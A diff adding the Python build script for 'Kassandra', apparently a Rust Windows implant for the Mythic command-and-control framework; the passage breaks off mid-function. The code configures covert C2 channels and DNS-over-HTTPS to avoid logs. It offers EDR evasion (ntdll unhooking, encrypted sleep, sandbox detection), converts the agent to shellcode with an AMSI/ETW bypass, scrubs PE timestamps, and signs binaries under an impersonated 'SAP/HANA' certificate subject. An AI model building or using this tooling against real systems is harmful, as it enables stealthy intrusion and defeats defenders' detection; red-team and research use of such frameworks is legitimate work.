@@ -1,0 +1,864 @@
+import pathlib
+import os
+import shutil
+from mythic_container.PayloadBuilder import *
+from mythic_container.MythicCommandBase import *
+from mythic_container.MythicRPC import *
+import json
+import tempfile
+from distutils.dir_util import copy_tree
+import asyncio
+import time
+import base64
+import subprocess
+import fcntl
+
+from .pe_opsec import (
+    audit_pe,
+    pe_opsec_link_rustflags,
+    sanitize_pe_timestamps,
+)
+
+class KassandraAgent(PayloadType):
+    name = "Kassandra"
+    file_extension = "exe"
+    author = "Tuco"
+    supported_os = [SupportedOS.Windows]
+    wrapper = False
+    wrapped_payloads = []
+    note = """Windows implant in Rust with EDR evasion, indirect syscalls, and OPSEC-safe defaults"""
+    supports_dynamic_loading = False
+    c2_profiles = ["http", "httpx", "jwt_c2", "s3_storage", "tailscale"]
+    # Donut shellcode format / AMSI bypass choices (same ordering as Apollo / donut -f / -b).
+    shellcode_format_options = ["Binary", "Base64", "C", "Ruby", "Python", "Powershell", "C#", "Hex"]
+    shellcode_bypass_options = ["None", "Abort on fail", "Continue on fail"]
+    c2_parameter_deviations = {
+        "s3_storage": {
+            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
+        },
+        "tailscale": {
+            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
+        },
+        "httpx": {
+            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
+        }
+    }
+    mythic_encrypts = False
+    translation_container = "KassandraTranslator"
+    build_parameters = [
+        BuildParameter(
+            name="output",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Choose output format. Shellcode converts the compiled EXE through Donut (PIC).",
+            choices=["exe", "dll", "shellcode"],
+            default_value="exe",
+            ui_position=1,
+        ),
+        BuildParameter(
+            name="shellcode_format",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=shellcode_format_options,
+            default_value="Binary",
+            description="Donut shellcode format options.",
+            group_name="Shellcode Options",
+            hide_conditions=[
+                HideCondition(name="output", operand=HideConditionOperand.NotEQ, value="shellcode")
+            ],
+            ui_position=2,
+        ),
+        BuildParameter(
+            name="shellcode_bypass",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=shellcode_bypass_options,
+            default_value="Continue on fail",
+            description="Donut AMSI/WLDP/ETW bypass behavior.",
+            group_name="Shellcode Options",
+            hide_conditions=[
+                HideCondition(name="output", operand=HideConditionOperand.NotEQ, value="shellcode")
+            ],
+            ui_position=3,
+        ),
+        BuildParameter(
+            name="adjust_filename",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="Automatically adjust payload extension based on selected output (e.g. .bin for shellcode Binary).",
+            ui_position=4,
+        ),
+        BuildParameter(
+            name="chunk_size",
+            parameter_type=BuildParameterType.String,
+            description="Chunk size in bytes for upload/download",
+            default_value="4096"
+        ),
+        BuildParameter(
+            name="tailscale_protocol",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["http", "tcp"],
+            default_value="http",
+            description="Agent-to-C2 transport inside the WireGuard tunnel: http (compatible) or tcp (lower overhead)",
+        ),
+        BuildParameter(
+            name="doh",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["off", "cloudflare", "google", "custom"],
+            default_value="off",
+            description="DNS-over-HTTPS: resolve Tailscale hostnames via DoH to avoid DNS logs",
+        ),
+        BuildParameter(
+            name="doh_url",
+            parameter_type=BuildParameterType.String,
+            default_value="",
+            description="Custom DoH resolver URL (only used when doh=custom, e.g. https://dns.example.com/dns-query)",
+        ),
+        BuildParameter(
+            name="no_console",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="Hide console window (windows_subsystem = windows). On by default for production.",
+        ),
+        BuildParameter(
+            name="busywork_intensity",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["off", "low", "medium", "high", "ultra"],
+            default_value="medium",
+            description="BusyWork evasion intensity between tasking rounds. Use 'off' or 'low' only for lab debugging.",
+        ),
+        BuildParameter(
+            name="debug_log",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Lab only: write lifecycle diagnostics to %TEMP%\\kassandra_debug.log. Leave off in production.",
+        ),
+        BuildParameter(
+            name="max_loaded_dlls",
+            parameter_type=BuildParameterType.String,
+            default_value="25",
+            description="EDR detection: max loaded DLL count before going dormant. EXE context ~25, DLL context ~35. Set 0 to disable count check (named-DLL check still runs).",
+        ),
+        BuildParameter(
+            name="ntp_sandbox_check",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Enable NTP-based sandbox detection at startup. Queries NTP to detect time acceleration. Generates UDP/123 traffic.",
+        ),
+        BuildParameter(
+            name="ntp_server",
+            parameter_type=BuildParameterType.String,
+            default_value="pool.ntp.org:123",
+            description="NTP server for sandbox detection (host:port). Use org-specific NTP if available to reduce IOC.",
+        ),
+        BuildParameter(
+            name="unhook_ntdll",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Strip EDR userland hooks from ntdll at startup (KnownDlls section object method). OFF by default; enable against older EDRs that rely on userland hooks.",
+        ),
+        BuildParameter(
+            name="ekko_sleep",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Ekko-style memory-encrypted sleep. Encrypts PE image with RC4 during idle via timer-queue ROP chain. Uses WaitForSingleObject to evade Hunt-Sleeping-Beacons.",
+        ),
+    ]
+    agent_path = pathlib.Path(".") / "Kassandra"
+    agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"
+    agent_code_path = agent_path / "agent_code"
+
+    build_steps = [
+        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
+        BuildStep(step_name="Provisioning C2", step_description="Setting up C2 credentials"),
+        BuildStep(step_name="Applying configuration", step_description="Stamping in configuration values"),
+        BuildStep(step_name="Compiling", step_description="Compiling the agent"),
+        BuildStep(step_name="Signing", step_description="Self-signed Authenticode via osslsigncode"),
+        BuildStep(step_name="PE OPSEC", step_description="Sanitize PE timestamps and audit OPSEC metadata"),
+        BuildStep(step_name="Donut", step_description="Converting EXE to position-independent shellcode via Donut"),
+    ]
+
+    async def build(self) -> BuildResponse:
+        resp = BuildResponse(status=BuildStatus.Success)
+        Config = {
+            "payload_uuid": self.uuid,
+            "callback_host": "",
+            "USER_AGENT": "Mozilla/5.0 MythicAgent",
+            "httpMethod": "POST",
+            "post_uri": "",
+            "headers": [],
+            "callback_port": 80,
+            "ssl":False,
+            "proxyEnabled": False,
+            "proxy_host": "",
+            "proxy_user": "",
+            "proxy_pass": "",
+        }
+
+        s3_config = None
+        use_s3 = False
+        enc_key = None
+
+        ts_config = None
+        use_tailscale = False
+
+        use_jwt_bearer = False
+        stdout_err = ""
+        for c2 in self.c2info:
+            profile = c2.get_c2profile()
+            profile_name = profile["name"]
+
+            if profile_name == "s3_storage":
+                use_s3 = True
+                params = c2.get_parameters_dict()
+                killdate = params.get("killdate", None)
+
+                # AESPSK is either a dict (Mythic enc-key object) or a plain string
+                aespsk_param = params.get("AESPSK", None)
+                enc_key = None
+                if isinstance(aespsk_param, dict):
+                    if aespsk_param.get("value") == "aes256_hmac":
+                        enc_key = aespsk_param.get("enc_key", None)
+                elif isinstance(aespsk_param, str) and aespsk_param not in ("none", ""):
+                    enc_key = aespsk_param
+
+                config_data = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
+                    ServiceName="s3_storage",
+                    ServiceRPCFunction="generate_config",
+                    ServiceRPCFunctionArguments={
+                        "payload_uuid": self.uuid,
+                        "killdate": killdate,
+                        "enc_key": enc_key,
+                    }
+                ))
+
+                if not config_data.Success:
+                    resp.status = BuildStatus.Error
+                    resp.build_stderr = f"S3 provisioning failed: {config_data.Error}"
+                    return resp
+
+                s3_config = config_data.Result
+
+            elif profile_name == "tailscale":
+                use_tailscale = True
+                params = c2.get_parameters_dict()
+
+                # AESPSK is either a dict (Mythic enc-key object) or a plain string
+                aespsk_param = params.get("AESPSK", None)
+                enc_key = None
+                if isinstance(aespsk_param, dict):
+                    if aespsk_param.get("value") == "aes256_hmac":
+                        enc_key = aespsk_param.get("enc_key", None)
+                elif isinstance(aespsk_param, str) and aespsk_param not in ("none", ""):
+                    enc_key = aespsk_param
+
+                config_data = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
+                    ServiceName="tailscale",
+                    ServiceRPCFunction="generate_config",
+                    ServiceRPCFunctionArguments={
+                        "payload_uuid": self.uuid,
+                        "killdate": params.get("killdate", ""),
+                        "enc_key": enc_key,
+                    }
+                ))
+
+                if not config_data.Success:
+                    resp.status = BuildStatus.Error
+                    resp.build_stderr = f"Tailscale provisioning failed: {config_data.Error}"
+                    return resp
+
+                ts_config = json.loads(config_data.Result) if isinstance(config_data.Result, str) else config_data.Result
+
+            elif profile_name == "jwt_c2":
+                use_jwt_bearer = True
+                params = c2.get_parameters_dict()
+                for key, val in params.items():
+                    if isinstance(val, dict) and 'enc_key' in val:
+                        stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
+                        encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
+                    elif key == "endpoint":
+                        Config["post_uri"] = val
+                    else:
+                        Config[key] = val
+
+            elif profile_name == "http":
+                for key, val in c2.get_parameters_dict().items():
+                    if isinstance(val, dict) and 'enc_key' in val:
+                        stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
+                        encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
+                    else:
+                        Config[key] = val
+            break
+
+        if not use_s3:
+            if "https://" in Config["callback_host"]:
+                Config["ssl"] = True
+            Config["callback_host"] = Config["callback_host"].replace("https://", "").replace("http://","")
+            if Config["proxy_host"] != "":
+                Config["proxyEnabled"] = True
+
+        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Gathering Files",
+                StepStdout="Found all files for payload",
+                StepSuccess=True
+            ))
+
+        if use_tailscale and ts_config:
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Provisioning C2",
+                StepStdout=(
+                    f"Tailscale C2 provisioned\n"
+                    f"Control URL: {ts_config['control_url']}\n"
+                    f"Server Hostname: {ts_config['server_hostname']}\n"
+                    f"Server Port: {ts_config['server_port']}\n"
+                    f"Auth Key: {ts_config['auth_key'][:12]}...\n"
+                    f"Protocol: {self.get_parameter('tailscale_protocol').upper()}\n"
+                    f"Transport: Embedded tsnet via Go FFI"
+                ),
+                StepSuccess=True,
+            ))
+        elif use_s3 and s3_config:
+            key_preview = s3_config["access_key_id"][:8] + "..."
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Provisioning C2",
+                StepStdout=(
+                    f"S3 Storage C2 provisioned\n"
+                    f"Bucket: {s3_config['bucket']}\n"
+                    f"Payload Prefix: {s3_config['payload_prefix']}/\n"
+                    f"Region: {s3_config['region']}\n"
+                    f"Bootstrap Key: {key_preview}\n"
+                    f"Encryption: {'AES-256-CBC + HMAC-SHA256 (EKE)' if enc_key else 'disabled'}\n"
+                    f"Mode: Runtime per-execution IAM provisioning\n"
+                    f"Bootstrap Permissions: PUT .req, GET/DELETE .creds (register/ only)"
+                ),
+                StepSuccess=True,
+            ))
+        else:
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Provisioning C2",
+                StepStdout="HTTP C2 - no additional provisioning needed",
+                StepSuccess=True,
+            ))
+
+        agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
+        copy_tree(str(self.agent_code_path), agent_build_path.name)
+
+
+        config_path = pathlib.Path(agent_build_path.name) / "kassandra" / "src" / "config.rs"
+        with open(config_path, "r+") as f:
+            content = f.read()
+            content = content.replace("%UUID%", Config["payload_uuid"])
+            content = content.replace("%HOSTNAME%", Config.get("callback_host", ""))
+            content = content.replace("%ENDPOINT%", Config.get("post_uri", ""))
+            content = content.replace("%PORT%", str(Config.get("callback_port", "80")))
+            ua = Config.get("USER_AGENT", "")
+            if not ua or "Mythic" in ua:
+                ua = "Mozilla/5.0 (Linux; Android 17; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7871.126 Mobile Safari/537.36"
+            content = content.replace("%USERAGENT%", ua)
+            content = content.replace("%PROXYURL%", Config.get("proxy_host", ""))
+            content = content.replace("%BUSYWORK_INTENSITY%", self.get_parameter("busywork_intensity"))
+            content = content.replace("%CHUNKSIZE%", str(self.get_parameter("chunk_size")))
+            content = content.replace("%CALLBACK_INTERVAL%", str(int(Config.get("callback_interval", 60))))
+            content = content.replace("%CALLBACK_JITTER%", str(int(Config.get("callback_jitter", 10))))
+            content = content.replace("%SSL%", "true" if Config.get("ssl") else "false")
+            content = content.replace("%PROXYENABLED%", "true" if Config.get("proxyEnabled") else "false")
+            content = content.replace("%USE_JWT_BEARER%", "true" if use_jwt_bearer else "false")
+
+            max_dlls = self.get_parameter("max_loaded_dlls") if self.get_parameter("max_loaded_dlls") else "25"
+            content = content.replace("%MAX_LOADED_DLLS%", str(int(max_dlls)))
+
+            ntp_check = self.get_parameter("ntp_sandbox_check") if self.get_parameter("ntp_sandbox_check") else False
+            content = content.replace("%NTP_SANDBOX_CHECK%", "true" if ntp_check else "false")
+            content = content.replace("%NTP_SERVER%", self.get_parameter("ntp_server") if self.get_parameter("ntp_server") else "pool.ntp.org:123")
+
+            if use_tailscale and ts_config:
+                content = content.replace("%USE_TAILSCALE%", "true")
+                content = content.replace("%TS_AUTH_KEY%", ts_config["auth_key"])
+                content = content.replace("%TS_CONTROL_URL%", ts_config["control_url"])
+                content = content.replace("%TS_SERVER_HOSTNAME%", ts_config["server_hostname"])
+                content = content.replace("%TS_SERVER_PORT%", ts_config["server_port"])
+                content = content.replace("%TS_PROTOCOL%", self.get_parameter("tailscale_protocol"))
+                content = content.replace("%TS_TCP_PORT%", ts_config.get("tcp_port", ""))
+                content = content.replace("%TS_DOH_URL%", _resolve_doh_url(self.get_parameter("doh"), self.get_parameter("doh_url")))
+            else:
+                content = content.replace("%USE_TAILSCALE%", "false")
+                content = content.replace("%TS_AUTH_KEY%", "")
+                content = content.replace("%TS_CONTROL_URL%", "")
+                content = content.replace("%TS_SERVER_HOSTNAME%", "")
+                content = content.replace("%TS_SERVER_PORT%", "")
+                content = content.replace("%TS_PROTOCOL%", "http")
+                content = content.replace("%TS_TCP_PORT%", "")
+                content = content.replace("%TS_DOH_URL%", "")
+
+            if use_s3 and s3_config:
+                content = content.replace("%USE_S3%", "true")
+                content = content.replace("%S3_ENDPOINT%", s3_config["s3_endpoint"])
+                content = content.replace("%S3_BUCKET%", s3_config["bucket"])
+                content = content.replace("%S3_PAYLOAD_PREFIX%", s3_config["payload_prefix"])
+                content = content.replace("%S3_BOOTSTRAP_ACCESS_KEY_ID%", s3_config["access_key_id"])
+                content = content.replace("%S3_BOOTSTRAP_SECRET_ACCESS_KEY%", s3_config["secret_access_key"])
+                content = content.replace("%S3_REGION%", s3_config["region"])
+                content = content.replace("%AESPSK%", enc_key if enc_key else "")
+            else:
+                content = content.replace("%USE_S3%", "false")
+                content = content.replace("%S3_ENDPOINT%", "")
+                content = content.replace("%S3_BUCKET%", "")
+                content = content.replace("%S3_PAYLOAD_PREFIX%", "")
+                content = content.replace("%S3_BOOTSTRAP_ACCESS_KEY_ID%", "")
+                content = content.replace("%S3_BOOTSTRAP_SECRET_ACCESS_KEY%", "")
+                content = content.replace("%S3_REGION%", "")
+                content = content.replace("%AESPSK%", "")
+
+            f.seek(0)
+            f.write(content)
+            f.truncate()
+            f.flush()                 # push Python's buffers
+            os.fsync(f.fileno())      # push OS buffers
+
+        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+            PayloadUUID=self.uuid,
+            StepName="Applying configuration",
+            StepStdout="All configuration setting applied",
+            StepSuccess=True
+        ))
+        output_format = self.get_parameter("output")
+        # Shellcode is always produced from a PE EXE (Donut loads the EXE entry point).
+        build_as_dll = output_format == "dll"
+        want_shellcode = output_format == "shellcode"
+
+        src_path = pathlib.Path(agent_build_path.name) / "kassandra" / "src"
+        if build_as_dll:
+            # Remove main.rs so cargo only sees the lib target
+            (src_path / "main.rs").unlink(missing_ok=True)
+            # Add [lib] section to Cargo.toml for cdylib output
+            cargo_path = pathlib.Path(agent_build_path.name) / "kassandra" / "Cargo.toml"
+            with open(cargo_path, "a") as f:
+                f.write('\n[lib]\ncrate-type = ["cdylib"]\npath = "src/lib.rs"\n')
+        else:
+            # Remove lib.rs so cargo only sees the bin target
+            (src_path / "lib.rs").unlink(missing_ok=True)
+
+        manifest = f"--manifest-path {agent_build_path.name}/kassandra/Cargo.toml"
+        target = "--target x86_64-pc-windows-gnu"
+        toolchain = "+nightly-2025-04-30"
+
+        # Persistent target dir: deps are pre-compiled in the Docker image (dummy-build
+        # pattern). Only the kassandra crate recompiles per payload (~15s vs ~10min).
+        cache_dir = "/opt/kassandra_cache"
+
+        # --- cargo build ---
+        features = []
+        if use_tailscale:
+            features.append("tailscale")
+        if self.get_parameter("no_console"):
+            features.append("no_console")
+        if self.get_parameter("debug_log"):
+            features.append("debug_log")
+        if self.get_parameter("unhook_ntdll"):
+            features.append("unhook")
+        if self.get_parameter("ekko_sleep"):
+            features.append("ekko")
+        features_flag = f"--features {','.join(features)}" if features else ""
+
+        if build_as_dll:
+            build_command = f"cargo {toolchain} build --release --lib {target} {manifest} {features_flag}"
+            filename = f"{cache_dir}/x86_64-pc-windows-gnu/release/kassandra.dll"
+        else:
+            build_command = f"cargo {toolchain} build --release {target} {manifest} {features_flag}"
+            filename = f"{cache_dir}/x86_64-pc-windows-gnu/release/kassandra.exe"
+
+        # OPSEC: remap paths + neutral COFF timestamp at link time (mingw --no-insert-timestamp).
+        rustflags = pe_opsec_link_rustflags(
+            "--remap-path-prefix /Mythic/=/ --remap-path-prefix /root/.cargo/registry/src/=dep/"
+        )
+        build_env = {
+            **dict(os.environ),
+            "RUSTFLAGS": rustflags,
+            "CARGO_TARGET_DIR": cache_dir,
+        }
+
+        # Serialize builds: the shared cache dir can only run one cargo at a time.
+        # The lock file lives next to the cache and is held for build + output copy.
+        lock_path = f"{cache_dir}.lock"
+        lock_fd = open(lock_path, "w")
+        try:
+            fcntl.flock(lock_fd, fcntl.LOCK_EX)
+
+            proc = await asyncio.create_subprocess_shell(
+                build_command,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                env=build_env,
+            )
+            stdout, stderr = await proc.communicate()
+            stdout_str = stdout.decode(errors="replace")
+            stderr_str = stderr.decode(errors="replace")
+
+            if proc.returncode != 0:
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Compiling",
+                    StepStdout=f"Compilation failed:\n{stderr_str}",
+                    StepSuccess=False
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = stderr_str
+                return resp
+
+            # Copy output binary out of the shared cache before releasing the lock,
+            # so the next build can overwrite the cache safely.
+            per_build_filename = f"{agent_build_path.name}/kassandra_{self.uuid}" + (".dll" if build_as_dll else ".exe")
+            shutil.copy2(filename, per_build_filename)
+            filename = per_build_filename
+        finally:
+            fcntl.flock(lock_fd, fcntl.LOCK_UN)
+            lock_fd.close()
+
+        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+            PayloadUUID=self.uuid,
+            StepName="Compiling",
+            StepStdout=f"Successfully compiled Kassandra\nRUSTFLAGS={rustflags}\n{stderr_str}",
+            StepSuccess=True
+        ))
+
+        # --- Signing ---
+        # Authenticode is for on-disk PE delivery. Shellcode packs the PE via Donut;
+        # a cert only bloats the intermediate object and has no runtime meaning.
+        if want_shellcode:
+            try:
+                pre_actions = sanitize_pe_timestamps(filename)
+            except Exception as e:
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Signing",
+                    StepStdout=f"PE timestamp sanitize failed: {e}",
+                    StepSuccess=False,
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = f"PE timestamp sanitize failed: {e}"
+                return resp
+            newName = filename
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Signing",
+                StepStdout=(
+                    "Skipped Authenticode (shellcode output).\n"
+                    f"pre-donut PE sanitize: {pre_actions or ['no changes']}"
+                ),
+                StepSuccess=True,
+            ))
+        else:
+            if not shutil.which("osslsigncode"):
+                msg = (
+                    "osslsigncode not found on PATH. "
+                    "Image is missing a required build tool (often a stale BinaryFiller-era image). "
+                    "Rebuild the kassandra container from current Dockerfile or apt-install osslsigncode."
+                )
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Signing",
+                    StepStdout=msg,
+                    StepSuccess=False,
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = msg
+                return resp
+
+            ext = ".dll" if build_as_dll else ".exe"
+            base = filename.removesuffix(ext)
+            newName = base + "_signed" + ext
+
+            try:
+                # Pre-sign: zero timestamps so the on-disk object is already neutral.
+                pre_actions = sanitize_pe_timestamps(filename)
+                pfx_path = generate_self_signed_cert()
+                sign_with_osslsigncode(filename, newName, pfx_path, "infected")
+                # Post-sign: osslsigncode / openssl may rewrite headers — re-neutralize.
+                post_actions = sanitize_pe_timestamps(newName)
+            except Exception as e:
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Signing",
+                    StepStdout=f"Signing failed: {e}",
+                    StepSuccess=False,
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = f"Signing failed: {e}"
+                return resp
+
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Signing",
+                StepStdout=(
+                    "Signed with self-signed cert (osslsigncode).\n"
+                    f"pre-sign sanitize: {pre_actions or ['no changes']}\n"
+                    f"post-sign sanitize: {post_actions or ['no changes']}"
+                ),
+                StepSuccess=True,
+            ))
+
+        # --- PE OPSEC audit (fail closed on pipeline-owned issues) ---
+        # For shellcode this audits the intermediate EXE before Donut packs it.
+        require_gui = bool(self.get_parameter("no_console"))
+        report = audit_pe(newName, require_gui=require_gui)
+        audit_text = report.summary()
+        if report.errors:
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="PE OPSEC",
+                StepStdout=(
+                    "PE OPSEC audit FAILED (build-pipeline issues must be fixed):\n"
+                    f"{audit_text}"
+                ),
+                StepSuccess=False,
+            ))
+            resp.status = BuildStatus.Error
+            resp.build_message = f"PE OPSEC audit failed:\n{audit_text}"
+            return resp
+
+        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+            PayloadUUID=self.uuid,
+            StepName="PE OPSEC",
+            StepStdout=f"PE OPSEC audit passed (warnings are non-fatal):\n{audit_text}",
+            StepSuccess=True,
+        ))
+
+        # --- Donut (shellcode only) ---
+        if want_shellcode:
+            sc_format = self.get_parameter("shellcode_format")
+            sc_bypass = self.get_parameter("shellcode_bypass")
+            try:
+                shellcode_path, donut_cmd, donut_log = await run_donut(
+                    pe_path=newName,
+                    work_dir=agent_build_path.name,
+                    format_name=sc_format,
+                    format_options=self.shellcode_format_options,
+                    bypass_name=sc_bypass,
+                    bypass_options=self.shellcode_bypass_options,
+                )
+            except Exception as e:
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Donut",
+                    StepStdout=f"Donut failed: {e}",
+                    StepSuccess=False,
+                ))
+                resp.status = BuildStatus.Error
+                resp.build_message = f"Donut failed: {e}"
+                return resp
+
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Donut",
+                StepStdout=f"Successfully converted via Donut:\n{donut_cmd}\n{donut_log}",
+                StepSuccess=True,
+            ))
+            resp.payload = open(shellcode_path, "rb").read()
+            resp.updated_filename = adjust_file_name(
+                self.filename,
+                sc_format,
+                output_format,
+                self.get_parameter("adjust_filename"),
+            )
+            return resp
+
+        # Non-shellcode path: mark Donut step as skipped so the build UI stays green.
+        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+            PayloadUUID=self.uuid,
+            StepName="Donut",
+            StepStdout="Skipped (output is not shellcode).",
+            StepSuccess=True,
+        ))
+
+        resp.payload = open(newName, "rb").read()
+        resp.updated_filename = adjust_file_name(
+            self.filename,
+            self.get_parameter("shellcode_format"),
+            output_format,
+            self.get_parameter("adjust_filename"),
+        )
+        return resp
+
+
+
+_DOH_URLS = {
+    "off": "",
+    "cloudflare": "https://1.1.1.1/dns-query",
+    "google": "https://8.8.8.8/dns-query",
+}
+
+# Preferred install path from the Kassandra Dockerfile; fall back to PATH.
+_DONUT_CANDIDATES = (
+    "/opt/donut/donut",
+    "/usr/local/bin/donut",
+)
+
+
+def _resolve_doh_url(choice, custom_url=""):
+    if choice == "custom":
+        return custom_url
+    return _DOH_URLS.get(choice, "")
+
+
+def _find_donut() -> str:
+    for path in _DONUT_CANDIDATES:
+        if os.path.isfile(path) and os.access(path, os.X_OK):
+            return path
+    which = shutil.which("donut")
+    if which:
+        return which
+    raise FileNotFoundError(
+        "donut binary not found. Expected /opt/donut/donut (install via Dockerfile) "
+        "or donut on PATH. Rebuild the kassandra container."
+    )
+
+
+async def run_donut(
+    pe_path: str,
+    work_dir: str,
+    format_name: str,
+    format_options: list,
+    bypass_name: str,
+    bypass_options: list,
+) -> tuple:
+    """
+    Convert a PE (EXE) to position-independent shellcode with Donut.
+
+    Mirrors Apollo's invocation:
+      donut -x3 -k2 -o loader.bin -i <pe> -fN -bN
+
+    -x3  loader does not exit / cleanup (agent main is a long-running loop)
+    -k2  randomize module names (entropy without full PE encryption)
+    -fN  output format (1=Binary … 8=Hex)
+    -bN  AMSI/WLDP/ETW bypass (1=None, 2=Abort on fail, 3=Continue on fail)
+    """
+    donut_path = _find_donut()
+    # Ensure execute bit (image layers sometimes drop it).
+    os.chmod(donut_path, 0o755)
+
+    try:
+        format_idx = format_options.index(format_name) + 1
+    except ValueError as e:
+        raise ValueError(f"Unknown shellcode_format {format_name!r}") from e
+    try:
+        bypass_idx = bypass_options.index(bypass_name) + 1
+    except ValueError as e:
+        raise ValueError(f"Unknown shellcode_bypass {bypass_name!r}") from e
+
+    out_name = "loader.bin"
+    shellcode_path = os.path.join(work_dir, out_name)
+    # Absolute -i path so cwd can be the temp build dir (matches Apollo).
+    pe_abs = os.path.abspath(pe_path)
+    argv = [
+        donut_path,
+        "-x3",
+        "-k2",
+        "-o", out_name,
+        "-i", pe_abs,
+        f"-f{format_idx}",
+        f"-b{bypass_idx}",
+    ]
+    cmd_display = " ".join(argv)
+
+    proc = await asyncio.create_subprocess_exec(
+        *argv,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
+        cwd=work_dir,
+    )
+    stdout, stderr = await proc.communicate()
+    log = f"[stdout]\n{stdout.decode(errors='replace')}\n[stderr]\n{stderr.decode(errors='replace')}"
+
+    if proc.returncode != 0:
+        raise RuntimeError(
+            f"donut exited {proc.returncode}\nCommand: {cmd_display}\n{log}"
+        )
+    if not os.path.isfile(shellcode_path):
+        raise RuntimeError(
+            f"donut succeeded but output missing: {shellcode_path}\nCommand: {cmd_display}\n{log}"
+        )
+    if os.path.getsize(shellcode_path) == 0:
+        raise RuntimeError(f"donut produced empty shellcode at {shellcode_path}\n{log}")
+
+    return shellcode_path, cmd_display, log
+
+
+def adjust_file_name(filename, shellcode_format, output_type, adjust_filename):
+    """Mirror Apollo: rewrite the download extension for the selected output."""
+    if not adjust_filename:
+        return filename
+    if not filename:
+        return filename
+    pieces = filename.rsplit(".", 1)
+    original = pieces[0] if len(pieces) == 2 else filename
+
+    if output_type == "exe":
+        return original + ".exe"
+    if output_type == "dll":
+        return original + ".dll"
+    if output_type != "shellcode":
+        return filename
+
+    ext_map = {
+        "Binary": ".bin",
+        "Base64": ".txt",
+        "C": ".c",
+        "Ruby": ".rb",
+        "Python": ".py",
+        "Powershell": ".ps1",
+        "C#": ".cs",
+        "Hex": ".txt",
+    }
+    return original + ext_map.get(shellcode_format, ".bin")
+
+
+def generate_self_signed_cert(name="mycodecert", password="infected"):
+    key = f"{name}.key"
+    crt = f"{name}.crt"
+    pfx = f"{name}.pfx"
+
+    subprocess.run(["openssl", "genrsa", "-out", key, "2048"], check=True)
+
+    subprocess.run([
+        "openssl", "req", "-new", "-x509",
+        "-key", key,
+        "-out", crt,
+        "-days", "3650",
+        "-subj", "/CN=SAP/O=HANA"
+    ], check=True)
+
+    subprocess.run([
+        "openssl", "pkcs12", "-export",
+        "-out", pfx,
+        "-inkey", key,
+        "-in", crt,
+        "-passout", f"pass:{password}"
+    ], check=True)
+
+    return pfx
+
+def sign_with_osslsigncode(input_exe, output_exe, cert_pfx, pfx_pass):
+    result = subprocess.run(
+        [
+            "osslsigncode", "sign",
+            "-pkcs12", cert_pfx,
+            "-pass", pfx_pass,
+            "-n", "Kassandra",
